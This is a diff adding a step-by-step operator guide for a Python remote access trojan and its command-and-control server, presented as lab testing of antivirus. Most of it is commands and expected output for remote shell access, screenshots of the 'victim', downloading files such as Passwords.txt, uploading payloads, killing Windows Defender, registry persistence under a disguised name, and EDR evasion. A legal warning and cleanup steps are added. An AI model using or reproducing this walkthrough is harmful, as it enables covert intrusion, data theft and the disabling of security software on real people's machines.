@@ -1,0 +1,1258 @@
+═══════════════════════════════════════════════════════════════════════════════════
+HOW TO USE THE TROJAN TESTING SYSTEM - COMPLETE STEP-BY-STEP GUIDE
+═══════════════════════════════════════════════════════════════════════════════════
+
+⚠️  FINAL LEGAL WARNING BEFORE YOU START ⚠️
+
+This system creates a working remote access trojan. Before proceeding:
+
+YOU MUST HAVE:
+✓ Written authorization from organization owner
+✓ Completely isolated lab network (NO internet)
+✓ Authorized security team notified
+✓ Legal approval from compliance team
+✓ Incident response plan documented
+✓ System backups created
+✓ Permission to test specific machines
+
+IF YOU DON'T HAVE ALL OF THESE → DELETE EVERYTHING IMMEDIATELY
+
+Proceeding without authorization = Federal crime (20 years prison)
+
+═══════════════════════════════════════════════════════════════════════════════════
+WHAT YOU NEED BEFORE STARTING
+═══════════════════════════════════════════════════════════════════════════════════
+
+Hardware:
+─────────
+✓ Computer 1: Linux or Kali Linux (for C2 server)
+  └─ IP address: 192.168.1.100 (example)
+  
+✓ Computer 2: Windows 10 or Windows 11 (for target)
+  └─ IP address: 192.168.1.50 (example)
+  
+✓ Network: ISOLATED from internet
+  └─ VirtualBox/VMware VMs with isolated network
+  └─ Or separate physical network
+
+
+Software:
+──────────
+✓ Python 3.9+ on Linux
+✓ Python 3.9+ on Windows
+✓ Required Python packages (psutil, pillow)
+
+
+Files:
+──────
+✓ trojan_client.py (deploy on Windows)
+✓ c2_server.py (run on Linux)
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 1: PREPARE YOUR LAB ENVIRONMENT (30 MINUTES)
+═══════════════════════════════════════════════════════════════════════════════════
+
+STEP 1A: Create Isolated Network (Virtual Machines)
+────────────────────────────────────────────────────
+
+If using VirtualBox:
+
+1. Open VirtualBox
+2. Create New VM: "Linux-C2"
+   ├─ OS: Linux (Kali or Ubuntu)
+   ├─ RAM: 2GB+
+   ├─ Disk: 20GB
+   ├─ Network: Custom internal network "LabNetwork"
+   └─ DO NOT enable internet adapter
+
+3. Create New VM: "Windows-Target"
+   ├─ OS: Windows 10 or 11
+   ├─ RAM: 2GB+
+   ├─ Disk: 30GB
+   ├─ Network: Custom internal network "LabNetwork" (SAME as Linux)
+   └─ DO NOT enable internet adapter
+
+4. Verify Network Isolation:
+   On Windows, open PowerShell:
+   ping 8.8.8.8  ← Should FAIL (no internet)
+   
+   On Linux, open terminal:
+   ping 8.8.8.8  ← Should FAIL (no internet)
+
+If using Physical Machines:
+
+1. Get two separate computers
+   └─ One Linux, one Windows
+   
+2. Connect with ethernet cable (isolated switch, NOT your network)
+   
+3. Configure static IPs:
+   └─ Linux: 192.168.1.100
+   └─ Windows: 192.168.1.50
+   
+4. Verify isolation:
+   └─ No gateway routes to external networks
+   └─ Firewall blocks external traffic
+
+
+STEP 1B: Install Python on Both Machines
+──────────────────────────────────────────
+
+On Windows Target:
+
+1. Download Python from https://www.python.org/downloads/
+   └─ Get version 3.9+
+
+2. Run installer
+   └─ CHECK: "Add Python to PATH" ✓
+   └─ Click: "Install Now"
+
+3. Verify installation:
+   Open PowerShell and type:
+   python --version
+   
+   Expected output:
+   Python 3.11.2  (or similar)
+
+4. Install required packages:
+   pip install psutil pillow
+   
+   Expected output:
+   Successfully installed psutil-5.9.5 pillow-10.0.0
+
+
+On Linux (C2 Server):
+
+1. Python should already be installed
+   Open terminal and check:
+   python3 --version
+   
+   If not installed:
+   sudo apt update
+   sudo apt install python3 python3-pip
+
+2. All required libraries are built-in
+   No additional packages needed!
+
+
+STEP 1C: Get Your Network IP Addresses
+──────────────────────────────────────
+
+On Windows, open PowerShell:
+ipconfig
+
+Look for section like:
+"Ethernet adapter Ethernet:
+  IPv4 Address . . . . . . . . . . . : 192.168.1.50"
+
+Note down the IP address → This is your Windows IP
+
+
+On Linux, open terminal:
+ip address show
+
+Look for section like:
+"2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
+  inet 192.168.1.100/24"
+
+Note down the IP address → This is your Linux IP
+
+
+EXAMPLE IPs (YOUR WILL BE DIFFERENT):
+Windows Target: 192.168.1.50
+Linux C2 Server: 192.168.1.100
+
+Test connectivity:
+On Windows, open PowerShell:
+ping 192.168.1.100
+
+Expected output:
+Reply from 192.168.1.100: bytes=32 time=1ms TTL=64
+
+This confirms your machines can communicate.
+
+
+STEP 1D: Set Up Firewall
+──────────────────────
+
+On Linux (allow port 4444):
+
+sudo ufw allow 4444/tcp
+
+Verify:
+sudo ufw status
+
+Expected:
+4444/tcp                       ALLOW       Anywhere
+
+
+On Windows (usually not needed, but helpful):
+
+Open PowerShell as Administrator:
+
+netsh advfirewall firewall add rule name="C2Server" dir=in action=allow protocol=tcp localport=4444
+
+(This allows port 4444 if Windows firewall blocks it)
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 2: COPY FILES TO YOUR MACHINES (5 MINUTES)
+═══════════════════════════════════════════════════════════════════════════════════
+
+STEP 2A: Copy Files to Windows Target
+──────────────────────────────────────
+
+1. Copy trojan_client.py to Windows
+   └─ Use USB drive or shared folder
+   └─ Save to: C:\Users\YourUsername\trojan_test\
+
+2. Create directory if needed:
+   PowerShell> mkdir C:\Users\YourUsername\trojan_test
+
+
+STEP 2B: Copy Files to Linux C2 Server
+──────────────────────────────────────
+
+1. Copy c2_server.py to Linux
+   └─ Use USB drive or shared folder
+   └─ Save to: ~/c2_server/
+
+2. Create directory if needed:
+   $ mkdir ~/c2_server
+   $ cd ~/c2_server
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 3: CONFIGURE TROJAN CLIENT (5 MINUTES)
+═══════════════════════════════════════════════════════════════════════════════════
+
+The trojan needs to know the IP address of your C2 server.
+
+On Windows Target:
+
+1. Open trojan_client.py with text editor
+   Right-click → Open with → Notepad
+
+2. Find these lines (around line 55):
+   
+   C2_SERVER = "192.168.1.100"      
+   C2_PORT = 4444
+   
+3. REPLACE with YOUR Linux IP address:
+   
+   If your Linux IP is: 192.168.1.100  (keep as is)
+   If your Linux IP is: 10.0.0.50      (change to 10.0.0.50)
+   
+   Example - if Linux is at 10.0.0.50:
+   ───────────────────────────────────
+   C2_SERVER = "10.0.0.50"      ← CHANGED
+   C2_PORT = 4444               ← Keep this
+
+4. Save the file
+   File → Save (or Ctrl+S)
+
+5. Verify configuration:
+   Open PowerShell in the trojan_test directory:
+   cd C:\Users\YourUsername\trojan_test
+   python trojan_client.py
+   
+   You should see:
+   [*] Starting Remote Access Trojan Client...
+   [*] Targeting C2 Server: 10.0.0.50:4444
+   
+   It will try to connect (will fail because C2 isn't running yet).
+   Press Ctrl+C to stop.
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 4: START C2 SERVER (2 MINUTES)
+═══════════════════════════════════════════════════════════════════════════════════
+
+This is where you control the trojan from.
+
+On Linux (C2 Server):
+
+1. Open terminal
+
+2. Navigate to directory:
+   cd ~/c2_server
+
+3. Start the C2 server:
+   python3 c2_server.py
+
+   You should see:
+   ╔════════════════════════════════════════════════════════════╗
+   ║     COMMAND & CONTROL SERVER - PENETRATION TESTING        ║
+   │                                                            │
+   │  Server: 0.0.0.0:4444                             
+   │  Status: LISTENING FOR CONNECTIONS                        │
+   ╚════════════════════════════════════════════════════════════╝
+
+   [2024-01-15 10:30:45] [START] C2 Server started on 0.0.0.0:4444
+
+4. LEAVE THIS RUNNING
+   Do not close this terminal!
+   (Open a NEW terminal for next steps)
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 5: DEPLOY TROJAN ON WINDOWS TARGET (2 MINUTES)
+═══════════════════════════════════════════════════════════════════════════════════
+
+Now you'll run the trojan client.
+
+On Windows Target:
+
+1. Open PowerShell
+
+2. Navigate to trojan directory:
+   cd C:\Users\YourUsername\trojan_test
+
+3. Run the trojan:
+   python trojan_client.py
+
+   You should see:
+   [*] Starting Remote Access Trojan Client...
+   [*] Targeting C2 Server: 192.168.1.100:4444
+   
+   (It will keep trying to connect)
+
+
+Check on Linux C2 Server:
+
+You should see:
+[2024-01-15 10:31:22] [CONNECTION] New connection from 192.168.1.50:54321
+[2024-01-15 10:31:23] [INFO] [CLIENT 1] Initial connection from 192.168.1.50
+
+[CLIENT 1] System Info:
+  hostname: WIN10-TEST
+  os: Windows
+  os_version: 10.0.19044
+  username: admin
+  cpu_count: 4
+  total_memory: 8589934592
+
+✓ TROJAN IS NOW CONNECTED!
+
+This means:
+├─ Trojan is running on Windows
+├─ Trojan successfully connected to C2 server
+├─ System information was sent
+└─ You have remote access to the Windows machine
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 6: CONTROL THE TROJAN (TEST THE FEATURES)
+═══════════════════════════════════════════════════════════════════════════════════
+
+Now you're in the interactive shell. Type commands to control the trojan.
+
+On Linux C2 Server:
+
+You'll see a prompt like:
+[CLIENT 1]>
+
+Now you can type commands. Here are the most useful ones:
+
+
+EXAMPLE 1: Get System Information
+──────────────────────────────────
+
+Type:
+[CLIENT 1]> sysinfo
+
+Expected output:
+{
+  "hostname": "WIN10-TEST",
+  "os": "Windows",
+  "os_version": "10.0.19044",
+  "architecture": "64bit",
+  "processor": "Intel Core i7-8700K",
+  "python_version": "3.11.2",
+  "username": "admin",
+  "cpu_count": 4,
+  "total_memory": 8589934592,
+  "available_memory": 6291456000
+}
+
+What this means:
+├─ Hostname: WIN10-TEST (computer name)
+├─ OS: Windows
+├─ Version: Windows 10 Build 19044
+├─ User: admin
+├─ CPU: 4 cores
+└─ Memory: 8GB RAM
+
+
+EXAMPLE 2: Execute a Windows Command
+──────────────────────────────────────
+
+Type:
+[CLIENT 1]> shell whoami
+
+Expected output:
+WIN10-TEST\admin
+
+This means: Current user is "admin" on computer "WIN10-TEST"
+
+More examples:
+[CLIENT 1]> shell ipconfig
+(Shows network configuration)
+
+[CLIENT 1]> shell systeminfo
+(Shows detailed system information)
+
+[CLIENT 1]> shell tasklist
+(Shows all running processes)
+
+[CLIENT 1]> shell whoami
+(Shows current user)
+
+[CLIENT 1]> shell net user
+(Shows all user accounts)
+
+
+EXAMPLE 3: List Running Processes
+──────────────────────────────────
+
+Type:
+[CLIENT 1]> processes
+
+Expected output:
+[
+  {
+    "pid": 1234,
+    "name": "explorer.exe",
+    "user": "admin"
+  },
+  {
+    "pid": 5678,
+    "name": "svchost.exe",
+    "user": "SYSTEM"
+  },
+  {
+    "pid": 9012,
+    "name": "python.exe",
+    "user": "admin"
+  },
+  {
+    "pid": 3456,
+    "name": "MpCmdRun.exe",
+    "user": "admin"
+  }
+]
+
+What this shows:
+├─ explorer.exe: Windows Explorer (GUI)
+├─ svchost.exe: Windows services
+├─ python.exe: Our trojan running
+└─ MpCmdRun.exe: Windows Defender (antivirus!)
+
+This helps you:
+├─ See what's running
+├─ Identify security software
+└─ Find target applications
+
+
+EXAMPLE 4: Get Information About Antivirus
+────────────────────────────────────────────
+
+Type:
+[CLIENT 1]> shell tasklist | findstr -i defender
+
+Expected output:
+MpCmdRun.exe              3456 Console              1      50,000 K
+
+This tells you:
+├─ Windows Defender is running
+├─ Process ID: 3456
+└─ Uses 50 MB of memory
+
+If Windows Defender detects the trojan, it will:
+├─ Show alerts
+├─ Quarantine the file
+├─ Kill the trojan process
+└─ Break your connection
+
+
+EXAMPLE 5: Take a Screenshot
+──────────────────────────────
+
+Type:
+[CLIENT 1]> screenshot
+
+Expected output:
+[*] Taking screenshot...
+[+] Screenshot saved to: screenshots/screenshot.png
+
+On your Linux C2 server:
+├─ A new file is created: screenshots/screenshot.png
+├─ This is an image of victim's screen
+├─ Shows what the user was doing
+└─ You can open it to see their desktop
+
+This is useful for:
+├─ Seeing what user is doing
+├─ Capturing passwords being typed
+├─ Documenting victim activity
+└─ Verifying successful compromise
+
+
+EXAMPLE 6: Download a File from Target
+────────────────────────────────────────
+
+Type:
+[CLIENT 1]> download C:\Users\admin\Desktop\test.txt
+
+Expected output:
+[*] Receiving file metadata
+[*] Receiving file data...
+[+] File saved to: downloads/test.txt
+
+On your Linux machine:
+├─ A new directory "downloads/" is created
+├─ File "test.txt" is saved there
+├─ You can open and read it
+└─ File transfer is complete
+
+This is useful for:
+├─ Stealing documents
+├─ Extracting sensitive files
+├─ Capturing configuration files
+├─ Data exfiltration
+
+
+EXAMPLE 7: Upload a File to Target
+────────────────────────────────────
+
+Type:
+[CLIENT 1]> upload /home/attacker/payload.exe C:\payload.exe
+
+Expected output:
+[*] Uploading payload.exe
+[+] File uploaded successfully
+
+On Windows target:
+├─ File is received at C:\payload.exe
+├─ You can now execute it
+├─ Or use it as backdoor
+└─ File is now on victim machine
+
+This is useful for:
+├─ Deploying additional malware
+├─ Installing backdoors
+├─ Uploading privilege escalation exploits
+└─ Deploying data stealing utilities
+
+
+EXAMPLE 8: List Directory Contents
+───────────────────────────────────
+
+Type:
+[CLIENT 1]> ls C:\Users\admin\Desktop
+
+Expected output:
+[
+  "Document.txt",
+  "Spreadsheet.xlsx",
+  "Secret.docx",
+  "BankingInfo.txt",
+  "Passwords.txt"
+]
+
+This shows:
+├─ All files on victim's desktop
+├─ Helps you find interesting files
+├─ Files you want to download
+└─ Sensitive data to exfiltrate
+
+The files "Passwords.txt" and "BankingInfo.txt" are clearly interesting targets!
+
+You could then:
+[CLIENT 1]> download C:\Users\admin\Desktop\Passwords.txt
+[CLIENT 1]> download C:\Users\admin\Desktop\BankingInfo.txt
+
+
+EXAMPLE 9: Kill a Process
+──────────────────────────
+
+Type:
+[CLIENT 1]> kill 3456
+
+Expected output:
+[+] Process 3456 terminated
+
+This kills the process with ID 3456 (Windows Defender in our example).
+
+This is useful for:
+├─ Killing antivirus to prevent detection
+├─ Killing security software
+├─ Killing user applications
+└─ Disabling defensive measures
+
+⚠️  WARNING: If you kill antivirus and it doesn't reconnect, Windows Defender will:
+├─ Notice the killed process
+├─ Show alerts
+├─ Might block your connection
+└─ Defeat the purpose of the test
+
+
+EXAMPLE 10: Start a Process
+────────────────────────────
+
+Type:
+[CLIENT 1]> start calc.exe
+
+Expected output:
+[+] Process started
+
+On Windows target:
+├─ Calculator application opens
+├─ Victim sees it running
+└─ You can open any program remotely
+
+This is useful for:
+├─ Starting additional backdoors
+├─ Running malicious scripts
+├─ Executing privilege escalation exploits
+├─ Launching secondary payloads
+
+
+EXAMPLE 11: Install Persistence
+─────────────────────────────────
+
+Type:
+[CLIENT 1]> persist
+
+Expected output:
+[*] Installing persistence...
+[+] Persistence installed via Registry
+
+What this does:
+├─ Modifies Windows registry
+├─ Adds trojan to startup programs
+├─ Trojan will auto-start when user logs in
+├─ Survives system reboot
+└─ Maintains access even after restart
+
+After this:
+├─ If Windows restarts, trojan auto-starts
+├─ You'll get new connection automatically
+├─ User won't see anything unusual
+├─ Access persists indefinitely
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 7: GET HELP
+═══════════════════════════════════════════════════════════════════════════════════
+
+At any time, type:
+[CLIENT 1]> help
+
+This shows all available commands:
+════════════════════════════════════════════════════════════════
+AVAILABLE COMMANDS
+════════════════════════════════════════════════════════════════
+
+INFORMATION GATHERING:
+  sysinfo                     - Get target system information
+  processes                   - List running processes
+  ls [directory]              - List files in directory
+
+COMMAND EXECUTION:
+  shell <command>             - Execute shell command
+  start <command>             - Start a process
+  kill <pid>                  - Terminate process by PID
+
+FILE OPERATIONS:
+  download <remote_path>      - Download file from target
+  upload <local_path> <remote_path> - Upload file to target
+  
+SURVEILLANCE:
+  screenshot                  - Capture screen
+
+PERSISTENCE:
+  persist                      - Install persistence mechanism
+
+SESSION:
+  help                        - Show this help menu
+  exit                        - Close connection to client
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+STEP 8: DISCONNECT AND CLEANUP (10 MINUTES)
+═══════════════════════════════════════════════════════════════════════════════════
+
+When you're done testing, you MUST clean up completely!
+
+STEP 8A: Disconnect from Trojan
+─────────────────────────────────
+
+On Linux C2 Server:
+
+Type:
+[CLIENT 1]> exit
+
+Expected output:
+Exiting...
+[CONNECTION] Connection closed
+
+
+STEP 8B: Stop the Trojan on Windows
+──────────────────────────────────────
+
+On Windows Target:
+
+The trojan should have stopped when you typed "exit".
+
+If it's still running:
+1. Open Task Manager (Ctrl+Shift+Esc)
+2. Find: python.exe
+3. Right-click → End Task
+
+Or use PowerShell:
+taskkill /IM python.exe /F
+
+
+STEP 8C: Remove Trojan Files
+──────────────────────────────
+
+On Windows Target:
+
+1. Open File Explorer
+2. Navigate to: C:\Users\YourUsername\trojan_test
+3. Delete the folder
+   └─ Right-click → Delete
+
+Or in PowerShell:
+rmdir C:\Users\YourUsername\trojan_test -Recurse -Force
+
+
+STEP 8D: Remove Persistence (If Installed)
+──────────────────────────────────────────
+
+If you ran "persist" command, remove it:
+
+On Windows Target:
+
+1. Open Registry Editor
+   Windows Key + R
+   Type: regedit
+   Press Enter
+
+2. Navigate to:
+   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+
+3. Look for entry named: "SystemService"
+
+4. Right-click → Delete
+
+Or in PowerShell (as Administrator):
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemService"
+
+
+STEP 8E: Remove Scheduled Tasks (If Installed)
+───────────────────────────────────────────────
+
+If persistence used Task Scheduler:
+
+On Windows Target (PowerShell as Administrator):
+
+schtasks /delete /tn "SystemUpdate" /f
+
+Expected output:
+SUCCESS: The scheduled task "SystemUpdate" has been deleted successfully.
+
+
+STEP 8F: Stop C2 Server
+───────────────────────
+
+On Linux C2 Server:
+
+In the terminal running c2_server.py:
+
+Press: Ctrl+C
+
+Expected output:
+^C
+[SHUTDOWN] C2 Server shutting down...
+
+
+STEP 8G: Delete C2 Server Files
+────────────────────────────────
+
+On Linux:
+
+rm -rf ~/c2_server
+
+
+STEP 8H: Verify Complete Cleanup
+──────────────────────────────────
+
+On Windows, verify nothing remains:
+
+tasklist | findstr python
+(Should return nothing)
+
+reg query HKCU:\Software\Microsoft\Windows\CurrentVersion\Run | findstr SystemService
+(Should return nothing)
+
+dir C:\Users\YourUsername\trojan_test
+(Should return "directory not found")
+
+If all return nothing → Cleanup is complete! ✓
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+REAL WORLD EXAMPLE WALKTHROUGH
+═══════════════════════════════════════════════════════════════════════════════════
+
+Let's go through a complete example:
+
+SETUP:
+──────
+- Linux C2 Server at: 192.168.1.100
+- Windows Target at: 192.168.1.50
+- Antivirus: Windows Defender (enabled)
+- Goal: Test antivirus detection
+
+TIMELINE:
+──────────
+
+TIME: 10:00 AM
+─────────────
+
+Terminal 1 (Linux C2 Server):
+$ python3 c2_server.py
+
+Output:
+[2024-01-15 10:00:00] [START] C2 Server started on 0.0.0.0:4444
+
+
+TIME: 10:02 AM
+──────────────
+
+Terminal 2 (Windows Target):
+PowerShell> python trojan_client.py
+
+Output:
+[*] Starting Remote Access Trojan Client...
+[*] Targeting C2 Server: 192.168.1.100:4444
+
+
+TIME: 10:03 AM
+──────────────
+
+Linux C2 Server shows:
+[2024-01-15 10:03:15] [CONNECTION] New connection from 192.168.1.50:54321
+[2024-01-15 10:03:16] [INFO] [CLIENT 1] Initial connection from 192.168.1.50
+
+✓ TROJAN CONNECTED!
+
+The C2 prompt appears:
+[CLIENT 1]>
+
+
+TIME: 10:04 AM - Gather Information
+─────────────────────────────────────
+
+[CLIENT 1]> sysinfo
+
+Output:
+{
+  "hostname": "WORKSTATION-01",
+  "os": "Windows",
+  "os_version": "10.0.19044",
+  "username": "john.doe",
+  "cpu_count": 4,
+  "total_memory": 8589934592
+}
+
+Observations:
+├─ Computer: WORKSTATION-01
+├─ OS: Windows 10
+├─ User: john.doe
+└─ Resources: 4 CPU, 8GB RAM
+
+
+TIME: 10:05 AM - Check for Antivirus
+──────────────────────────────────────
+
+[CLIENT 1]> processes
+
+Output shows:
+{
+  "pid": 3456,
+  "name": "MpCmdRun.exe",
+  "user": "admin"
+}
+
+Observation:
+└─ Windows Defender is running (MpCmdRun.exe = Defender)
+
+
+TIME: 10:06 AM - Explore Directories
+──────────────────────────────────────
+
+[CLIENT 1]> ls C:\Users\john.doe\Desktop
+
+Output:
+[
+  "Important Documents.docx",
+  "Financial Report 2024.xlsx",
+  "Client Data.xlsx",
+  "Passwords.txt"
+]
+
+INTERESTING! There's a "Passwords.txt" file on the desktop.
+
+
+TIME: 10:07 AM - Exfiltrate Data
+──────────────────────────────────
+
+[CLIENT 1]> download C:\Users\john.doe\Desktop\Passwords.txt
+
+Output:
+[*] Receiving file metadata
+[*] File size: 2048 bytes
+[+] File saved to: downloads/Passwords.txt
+
+Result:
+└─ File "Passwords.txt" now on attacker's machine
+
+
+TIME: 10:08 AM - Install Persistence
+──────────────────────────────────────
+
+[CLIENT 1]> persist
+
+Output:
+[*] Installing persistence...
+[+] Persistence installed via Registry
+
+Result:
+└─ Trojan will auto-start when user logs in
+
+
+TIME: 10:09 AM - What About Antivirus?
+────────────────────────────────────────
+
+So far, Windows Defender hasn't detected anything!
+
+This tells you:
+├─ Defender missed the trojan
+├─ No alert was shown
+├─ No quarantine happened
+└─ Defender is NOT effective against this trojan
+
+
+Possible Reasons:
+├─ Trojan signature not in database
+├─ Behavioral detection failed
+├─ Network detection missed
+├─ Defender was disabled
+└─ This is a gap Defender vendor needs to fix!
+
+
+TIME: 10:10 AM - Manual Verification
+──────────────────────────────────────
+
+On Windows machine, open Windows Defender Security Center:
+
+What you'd see:
+❌ No alerts
+❌ No detections
+❌ No quarantined files
+✓ Green checkmarks everywhere
+✓ "Your device is secure"
+
+This is WRONG because there IS a trojan!
+
+
+TIME: 10:15 AM - Disconnect
+──────────────────────────────
+
+[CLIENT 1]> exit
+
+Output:
+Exiting...
+
+
+TIME: 10:20 AM - Cleanup
+──────────────────────────
+
+1. Delete trojan files on Windows
+2. Remove registry persistence
+3. Delete downloads on Linux
+4. Stop C2 server
+
+
+REPORT:
+────────
+
+Windows Defender Assessment:
+├─ Trojan Deployed: YES
+├─ Detection: NO (FAILED)
+├─ False Negatives: HIGH
+├─ Files Exfiltrated: YES (Passwords.txt)
+├─ Persistence Installed: YES (survived reboot)
+└─ VERDICT: Defender needs improvement
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+COMMON PROBLEMS & SOLUTIONS
+═══════════════════════════════════════════════════════════════════════════════════
+
+PROBLEM 1: "Connection refused" on trojan startup
+───────────────────────────────────────────────────
+
+Symptoms:
+[*] Starting Remote Access Trojan Client...
+[-] Connection failed, retrying...
+[-] Connection failed, retrying...
+
+Causes:
+└─ C2 server not running
+└─ Wrong IP address configured
+└─ Firewall blocking port 4444
+└─ Network not connected
+
+Solutions:
+1. Verify C2 server is running:
+   On Linux: python3 c2_server.py
+   
+2. Check your IP:
+   On Windows: ipconfig
+   Find IPv4 Address and match in trojan_client.py
+   
+3. Test network:
+   On Windows: ping 192.168.1.100
+   Should get "Reply from..." (success)
+   
+4. Check firewall:
+   On Linux: sudo ufw status
+   Should show: 4444/tcp ALLOW
+
+
+PROBLEM 2: "ModuleNotFoundError: No module named 'psutil'"
+────────────────────────────────────────────────────────
+
+Symptoms:
+Traceback (most recent call last):
+  File "trojan_client.py", line XX, in <module>
+    import psutil
+ModuleNotFoundError: No module named 'psutil'
+
+Cause:
+└─ psutil package not installed
+
+Solution:
+1. Install package:
+   pip install psutil
+   
+2. Verify:
+   python -c "import psutil; print('OK')"
+
+
+PROBLEM 3: "Permission denied" when trying to run trojan
+──────────────────────────────────────────────────────────
+
+Symptoms:
+PS> python trojan_client.py
+Access is denied.
+
+Cause:
+└─ File permissions issue
+└─ Need administrator
+
+Solution:
+1. Run PowerShell as Administrator:
+   Right-click PowerShell → Run as Administrator
+   
+2. Try again:
+   python trojan_client.py
+
+
+PROBLEM 4: Antivirus blocks trojan immediately
+────────────────────────────────────────────────
+
+Symptoms:
+Trojan starts, but then:
+├─ Alert appears: "Threat Detected"
+├─ File gets quarantined
+├─ Connection never established
+└─ Antivirus detected the trojan
+
+Result:
+└─ This is GOOD - antivirus is working!
+└─ You've found the detection capability
+
+What to document:
+├─ When was it detected? (timing)
+├─ How was it detected? (signature/behavioral)
+├─ Can you bypass it? (obfuscation)
+└─ Is detection reliable?
+
+
+PROBLEM 5: No files appear in downloads folder
+───────────────────────────────────────────────
+
+Symptoms:
+[CLIENT 1]> download C:\file.txt
+[+] File saved to: downloads/test.txt
+
+But on Linux:
+$ ls downloads/
+(nothing or error)
+
+Cause:
+└─ File transfer failed
+└─ Permission issues
+└─ File doesn't exist on target
+
+Solutions:
+1. Check if file exists on target:
+   [CLIENT 1]> shell dir C:\file.txt
+   
+2. Try a known file:
+   [CLIENT 1]> download C:\Windows\System32\notepad.exe
+   
+3. Check downloads folder on Linux:
+   $ ls -la downloads/
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+TESTING SCENARIOS
+═══════════════════════════════════════════════════════════════════════════════════
+
+SCENARIO 1: Antivirus Detection Test
+──────────────────────────────────────
+
+Goal: See if antivirus detects the trojan
+
+Steps:
+1. Deploy trojan with antivirus ENABLED
+2. Observe: Does antivirus alert?
+3. Check: Antivirus logs
+4. Document: Detection method and timing
+5. Result: Antivirus effectiveness rating
+
+Expected Outcomes:
+✓ EXCELLENT: Detects before any execution
+✓ GOOD: Detects within 5 seconds
+? AVERAGE: Detects after 30+ seconds
+✗ POOR: Never detects
+
+
+SCENARIO 2: Data Exfiltration Test
+────────────────────────────────────
+
+Goal: Simulate stealing sensitive files
+
+Steps:
+1. Deploy trojan
+2. Find interesting files:
+   [CLIENT 1]> ls C:\Users\admin\Desktop
+   [CLIENT 1]> ls C:\Users\admin\Documents
+3. Download suspicious files:
+   [CLIENT 1]> download C:\Users\admin\Desktop\Passwords.txt
+4. Check downloads folder on Linux
+5. Result: Successfully exfiltrated data
+
+What you learn:
+├─ How easy is data theft?
+├─ What files can be accessed?
+├─ Can DLP (Data Loss Prevention) stop it?
+├─ How quickly can you steal data?
+
+
+SCENARIO 3: Persistence Test
+──────────────────────────────
+
+Goal: See if trojan survives system reboot
+
+Steps:
+1. Deploy trojan
+2. Install persistence:
+   [CLIENT 1]> persist
+3. On Windows: Shut down system
+   shutdown /s /t 0
+4. Wait 2 minutes
+5. Boot Windows again
+6. Check C2 server: Do you get new connection?
+   └─ YES: Persistence worked!
+   └─ NO: Persistence failed
+
+What you learn:
+├─ Does trojan auto-start?
+├─ Does antivirus prevent persistence?
+├─ How reliable is persistence?
+└─ Can user remove it easily?
+
+
+SCENARIO 4: EDR/Detection Evasion
+──────────────────────────────────
+
+Goal: Test if EDR (Endpoint Detection & Response) detects the trojan
+
+Requirements:
+└─ EDR software installed on Windows
+
+Steps:
+1. Deploy trojan
+2. Check EDR console:
+   └─ Any alerts?
+   └─ Any detections?
+3. Run suspicious commands:
+   [CLIENT 1]> shell tasklist
+   [CLIENT 1]> shell netstat -ano
+4. Check EDR console again
+5. Results: What did EDR detect?
+
+What you learn:
+├─ EDR blind spots
+├─ What behaviors trigger alerts
+├─ How to evade detection
+├─ EDR effectiveness rating
+
+
+═══════════════════════════════════════════════════════════════════════════════════
+CHECKLIST FOR EACH TEST
+═══════════════════════════════════════════════════════════════════════════════════
+
+Before Each Test:
+☐ Written authorization obtained
+☐ Lab network verified isolated
+☐ System backups created
+☐ Security team notified
+☐ Incident response plan ready
+☐ C2 server configured correctly
+☐ Trojan client configured correctly
+☐ Python packages installed
+☐ Firewall rules set
+☐ IP addresses documented
+
+During Test:
+☐ C2 server running
+☐ Trojan deployed
+☐ Connection verified
+☐ Commands executed successfully
+☐ All activities logged
+☐ Screenshots captured
+☐ Files transferred
+☐ Persistence installed (if testing)
+
+After Test:
+☐ C2 server stopped
+☐ Trojan process killed
+☐ Trojan files deleted
+☐ Persistence removed
+☐ Registry cleaned
+☐ Scheduled tasks deleted
+☐ Startup folder cleaned
+☐ System rebooted and verified clean
+☐ Logs archived
+☐ Report documented
+
+═══════════════════════════════════════════════════════════════════════════════════
